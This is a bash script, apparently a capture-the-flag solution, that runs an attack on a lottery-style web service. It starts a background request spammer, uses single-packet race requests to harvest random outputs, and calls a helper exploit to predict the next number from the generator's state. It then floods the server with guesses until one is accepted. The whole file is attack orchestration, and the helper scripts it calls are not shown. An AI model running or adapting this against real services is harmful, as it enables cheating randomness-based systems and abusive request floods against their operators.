#!/bin/bash

echo "Setting up..."

# clean up environment
rm response*.txt 2>/dev/null
pkill -f spammer.sh

# How many random numbers we need to see
guesses="65"
# skips used in our future prediction
skips="200"
# max requests we can put in a single packet attack
MAX_REQUESTS="100"
# Time in between spam requests
spam_period="0.2"

# start a background spamming script
echo "Initializing spamming script..."
./spammer.sh "$spam_period" &
SPAM_PID=$!

# Run first single packet attack to get randomness information
echo "Running single packet attack..."
./single-packet.py "$guesses" >response.txt

# compute a future lottery number
echo "Computing future lottery number..."
new_lottery=$(./exploit.py "$guesses" "$skips")

# server adds 1 to numbers
new_lottery=$((new_lottery+1))

echo "Future lottery number: $new_lottery"

rm response.txt

# Send single packet attacks until the server accepts your number
echo "Single packet attack to test future lottery number..."
if output=$(./single-packet.py "$MAX_REQUESTS" "$new_lottery" | grep -m 1 "\"correct\":true"); then
  echo "Found: $output"
elif output=$(./single-packet.py "$MAX_REQUESTS" "$new_lottery" | grep -m 1 "\"correct\":true"); then
  echo "Found: $output"
else
  echo "Not found"
fi

echo "Cleaning up..."
kill $SPAM_PID